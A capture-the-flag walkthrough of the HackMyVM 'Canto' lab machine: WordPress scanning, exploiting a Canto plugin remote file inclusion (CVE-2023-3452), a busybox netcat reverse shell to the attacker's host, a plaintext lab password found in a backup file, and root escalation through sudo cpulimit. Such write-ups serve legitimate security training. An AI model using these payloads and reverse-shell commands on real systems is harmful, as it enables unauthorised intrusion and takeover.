# CANTO

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| CANTO | Pylon | Beginner | HackMyVM |

**Summary:** The exploitation of the Canto machine began with a vulnerability in the web application layer, specifically targeting a WordPress instance running an outdated version of the Canto plugin. By identifying an unauthenticated Remote File Inclusion flaw within the plugin's library, I was able to leverage the `wp_abspath` parameter to achieve Remote Code Execution. This initial access provided a foothold as the `www-data` service account, which I subsequently used to perform internal enumeration. By following clues left in the home directory of the user erik, I discovered a hidden database backup directory containing plaintext credentials. After pivoting to the erik account via these recovered credentials, I identified a misconfiguration in the sudoers policy that allowed the execution of the `cpulimit` utility with root privileges. By exploiting the process spawning functionality of this binary, I successfully escalated my privileges to the root level and secured full control over the system.

---

## Detailed Walkthrough

### 1. Reconnaissance and Scanning

The engagement began with a localized network scan to identify the target host within the lab environment. I utilized a custom PowerShell script to find active VirtualBox instances on the subnet.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
--------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.197 08:00:27:32:82:68 VirtualBox
```

Once the IP address was confirmed as 192.168.100.197, I proceeded with a comprehensive Nmap scan to enumerate open ports and services.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ nmap -sCV -p- -T4 192.168.100.197
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-15 19:47 WIB
Nmap scan report for 192.168.100.197
Host is up (0.0022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c6:af:18:21:fa:3f:3c:fc:9f:e4:ef:04:c9:16:cb:c7 (ECDSA)
|_  256 ba:0e:8f:0b:24:20:dc:75:b7:1b:04:a1:81:b6:6d:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
|_http-title: Canto
|_http-server-header: Apache/2.4.57 (Ubuntu)
|_http-generator: WordPress 6.5.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.88 seconds
```

### 2. WordPress Enumeration

The web server was hosting a WordPress site. I employed WPScan to identify installed plugins, themes, and potential users. The scan revealed several critical vulnerabilities in the `canto` plugin and identified a local user named erik.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ wpscan --url http://192.168.100.197 --api-token ... --enumerate ap,at,tt,cb,dbe,u --plugins-detection aggressive --themes-detection aggressive --force
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.100.197/ [192.168.100.197]
[+] Started: Fri May 15 19:53:09 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.100.197/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.100.197/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.100.197/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.100.197/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.100.197/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://192.168.100.197/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |
 | [!] 5 vulnerabilities identified:
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 6.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.5.7
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.5.7
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.100.197/wp-content/themes/twentytwentyfour/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.100.197/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | [!] Directory listing is enabled
 | Style URL: http://192.168.100.197/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.100.197/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checkin Checking Known Locations - Time: 00:06:28 <==== > (100399 / 120453) 83.35%  ETA:  Checking Known Locations - Time: 00:07:16 <====> (120453 / 120453) 100.00% Time: 00:07:16
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.100.197/wp-content/plugins/akismet/
 | Last Updated: 2026-04-23T22:34:00.000Z
 | Readme: http://192.168.100.197/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/plugins/akismet/readme.txt

[+] canto
 | Location: http://192.168.100.197/wp-content/plugins/canto/
 | Last Updated: 2026-05-07T09:11:00.000Z
 | Readme: http://192.168.100.197/wp-content/plugins/canto/readme.txt
 | [!] The version is out of date, the latest version is 3.1.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/plugins/canto/, status: 200
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Canto < 3.0.9 - Unauthenticated Blind SSRF
 |     Fixed in: 3.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063
 |      - https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0
 |
 | [!] Title: Canto < 3.0.5 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452
 |
 | [!] Title: Canto < 3.0.7 - Unauthenticated RCE
 |     Fixed in: 3.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096
 |      - https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability
 |
 | [!] Title: Canto < 3.0.9 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.9
 |     References:
 |      - https://wpscan.com/vulnerability/3ea53721-bdf6-4203-b6bc-2565d6283159
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4936
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95a68ae0-36da-499b-a09d-4c91db8aa338
 |
 | [!] Title: Canto < 3.1.2 - Missing Authorization to Unauthenticated File Upload
 |     Fixed in: 3.1.2
 |     References:
 |      - https://wpscan.com/vulnerability/c189c05f-f00c-41bb-8fac-1f23da22e4fd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-3335
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0777f759-6980-4572-a866-0210bd5f5085
 |
 | [!] Title: Canto <= 3.1.1 - Missing Authorization to Authenticated (Subscriber+) Arbitrary Setting Modification
 |     References:
 |      - https://wpscan.com/vulnerability/cb121deb-0089-4b97-96e0-2abedcf67599
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-6441
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c1a0200f-9861-4eca-adbf-d458eb6b4e63
 |
 | Version: 3.0.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/plugins/canto/readme.txt
 | Confirmed By: Composer File (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/plugins/canto/package.json, Match: '3.0.4'

[+] Enumerating All Themes (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:18 <======> (32194 / 32194) 100.00% Time: 00:01:18
[+] Checking Theme Versions (via Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://192.168.100.197/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.4
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.100.197/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://192.168.100.197/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/themes/twentytwentyfour/, status: 200
 |
 | The version could not be determined.

[+] twentytwentythree
 | Location: http://192.168.100.197/wp-content/themes/twentytwentythree/
 | Latest Version: 1.6
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://192.168.100.197/wp-content/themes/twentytwentythree/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://192.168.100.197/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/themes/twentytwentythree/, status: 200
 |
 | The version could not be determined.

[+] twentytwentytwo
 | Location: http://192.168.100.197/wp-content/themes/twentytwentytwo/
 | Latest Version: 2.1
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://192.168.100.197/wp-content/themes/twentytwentytwo/readme.txt
 | Style URL: http://192.168.100.197/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.100.197/wp-content/themes/twentytwentytwo/, status: 200
 |
 | The version could not be determined.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:06 <========> (2575 / 2575) 100.00% Time: 00:00:06

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===========> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <============> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] erik
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.100.197/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 6
 | Requests Remaining: 19

[+] Finished: Fri May 15 20:02:25 2026
[+] Requests Done: 155513
[+] Cached Requests: 18
[+] Data Sent: 42.251 MB
[+] Data Received: 21.058 MB
[+] Memory used: 477.855 MB
[+] Elapsed time: 00:09:15
```

### 3. Initial Access via Canto RCE

Following the identification of the `canto` plugin version 3.0.4, I used searchsploit to look for known exploits. I found a Python script targeting an unauthenticated Remote File Inclusion vulnerability (CVE-2023-3452).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ searchsploit canto
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
NetScanTools Basic Edition 2.5 - 'Hostname' Denial of Service (PoC)                                  | windows/dos/45095.py
Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)                                          | multiple/webapps/49189.txt
Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)         | php/webapps/51826.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ searchsploit -m 51826.py
  Exploit: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51826
     Path: /usr/share/exploitdb/exploits/php/webapps/51826.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (344)
Copied to: /tmp/canto/51826.py
```

I examined the exploit code to understand the mechanism. The vulnerability lies in the improper handling of the `wp_abspath` variable in various plugin files, such as `download.php`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ cat 51826.py
# Exploit Title: Wordpress Plugin Canto < 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)
# Date: 04/11/2023
# Exploit Author: Leopoldo Angulo (leoanggal1)
# Vendor Homepage: https://wordpress.org/plugins/canto/
# Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip
# Version: All versions of Canto Plugin prior to 3.0.5
# Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4
# CVE : CVE-2023-3452

#PoC Notes:
#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)
#This code exploits the improper handling of the wp_abspath variable in the following line of the "download.php" code:
#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...
#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.
# More information in Leoanggal1's Github
...
```

I executed the exploit to confirm Remote Code Execution by running the `id` command.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ python3 51826.py -u http://192.168.100.197 -LHOST 192.168.100.1 -c 'id'
Exploitation URL: http://192.168.100.197/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.100.1:8080&cmd=id
Local web server on port 8080...
172.20.128.1 - - [15/May/2026 20:09:49] "GET /wp-admin/admin.php HTTP/1.1" 200 -
Server response:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Shutting down local web server...
```

To establish a more stable connection, I searched for available binaries and used `busybox` to spawn a reverse shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl 'http://192.168.100.197/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.100.1:8080&cmd=which%20busybox'
/usr/bin/busybox
```

I set up a listener on my local machine and triggered the reverse shell.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl 'http://192.168.100.197/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.100.1:8080&cmd=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash'
```

Upon receiving the connection, I upgraded the shell to a fully interactive TTY using Python.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 60191
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/canto]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ cd /
www-data@canto:/$ export SHELL=/bin/bash
www-data@canto:/$ export TERM=xterm
www-data@canto:/$ stty rows 70 cols 100
```

### 4. Lateral Movement to User Erik

With initial access established, I performed internal enumeration to find a path to a more privileged user account. I checked the home directory of erik and found a notes directory.

```bash
www-data@canto:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
erik:x:1001:1001::/home/erik:/bin/bash
www-data@canto:/$ ls -la /home
total 12
drwxr-xr-x  3 root root     4096 May 12  2024 .
drwxr-xr-x 20 root root     4096 May 12  2024 ..
drwxr-xr--  5 erik www-data 4096 May 12  2024 erik
www-data@canto:/$ cd /home/erik/
www-data@canto:/home/erik$ ls -la
total 36
drwxr-xr-- 5 erik www-data 4096 May 12  2024 .
drwxr-xr-x 3 root root     4096 May 12  2024 ..
lrwxrwxrwx 1 root root        9 May 12  2024 .bash_history -> /dev/null
-rw-r--r-- 1 erik erik      220 Jan  7  2023 .bash_logout
-rw-r--r-- 1 erik erik     3771 Jan  7  2023 .bashrc
drwx------ 2 erik erik     4096 May 12  2024 .cache
drwxrwxr-x 3 erik erik     4096 May 12  2024 .local
-rw-r--r-- 1 erik erik      807 Jan  7  2023 .profile
drwxrwxr-x 2 erik erik     4096 May 12  2024 notes
-rw-r----- 1 root erik       33 May 12  2024 user.txt
```

Inside the notes directory, I found files describing recent administrative activities, including the creation of a backups folder.

```bash
www-data@canto:/home/erik$ cd notes/
www-data@canto:/home/erik/notes$ ls -la
total 16
drwxrwxr-x 2 erik erik     4096 May 12  2024 .
drwxr-xr-- 5 erik www-data 4096 May 12  2024 ..
-rw-rw-r-- 1 erik erik       68 May 12  2024 Day1.txt
-rw-rw-r-- 1 erik erik       71 May 12  2024 Day2.txt
www-data@canto:/home/erik/notes$ cat Day1.txt
On the first day I have updated some plugins and the website theme.
www-data@canto:/home/erik/notes$ cat Day2.txt
I almost lost the database with my user so I created a backups folder.
```

I searched the system for directories containing the word "backup" and discovered a custom location at `/var/wordpress/backups`.

```bash
www-data@canto:/home/erik/notes$ find / -type d -name "*backup*" 2>/dev/null
/snap/lxd/26200/share/lxd-documentation/backup
/snap/lxd/26200/share/lxd-documentation/howto/instances_backup
/snap/lxd/26200/share/lxd-documentation/howto/storage_backup_volume
/snap/lxd/25846/share/lxd-documentation/backup
/snap/lxd/25846/share/lxd-documentation/howto/instances_backup
/snap/lxd/25846/share/lxd-documentation/howto/storage_backup_volume
/snap/core22/1380/var/backups
/snap/core22/864/var/backups
/var/backups
/var/wordpress/backups
```

Checking the contents of this directory revealed a text file containing erik's password in plaintext.

```bash
www-data@canto:/home/erik/notes$ ls -la /var/wordpress/backups/
total 12
drwxr-xr-x 2 root root 4096 May 12  2024 .
drwxr-xr-x 3 root root 4096 May 12  2024 ..
-rw-r--r-- 1 root root  185 May 12  2024 12052024.txt
www-data@canto:/home/erik/notes$ cat /var/wordpress/backups/12052024.txt
------------------------------------
| Users     |      Password        |
------------|----------------------|
| erik      | th1sIsTheP3ssw0rd!   |
------------------------------------
```

Using the recovered credential, I successfully switched to the erik user.

```bash
www-data@canto:/home/erik/notes$ su - erik
Password:
erik@canto:~$ id
uid=1001(erik) gid=1001(erik) groups=1001(erik)
```

### 5. Privilege Escalation to Root

As erik, I checked my sudo privileges and found that the user was permitted to run `/usr/bin/cpulimit` as root without a password.

```bash
erik@canto:~$ sudo -l
Matching Defaults entries for erik on canto:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
erik@canto:~$ ls -la /usr/bin/cpulimit
-rwxr-xr-x 1 root root 31424 Jul 15  2023 /usr/bin/cpulimit
```

![](image.png)

The `cpulimit` utility can be used to execute arbitrary commands by passing them as arguments. By running `/bin/sh` through `cpulimit` with sudo, I obtained a root shell and captured the final flags.

```bash
erik@canto:~$ sudo /usr/bin/cpulimit -l 100 -f -- /bin/sh
Process 1295 detected
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# hostname
canto
# cat /root/root.txt
[REDACTED]b49
# cat /home/erik/user.txt
[REDACTED]27e
```

---

## Attack Chain Summary
1. **Reconnaissance**: Scanning the network revealed the target host and open ports for SSH and HTTP services.
2. **Vulnerability Discovery**: Enumerating the WordPress installation identified an outdated Canto plugin vulnerable to Remote File Inclusion.
3. **Exploitation**: Leveraging the RFI flaw through the `wp_abspath` parameter allowed for Remote Code Execution and a reverse shell.
4. **Internal Enumeration**: Discovering a plaintext password in a custom backup folder allowed for lateral movement to the erik user.
5. **Privilege Escalation**: Exploiting a sudoers misconfiguration for the `cpulimit` binary provided direct access to a root shell.

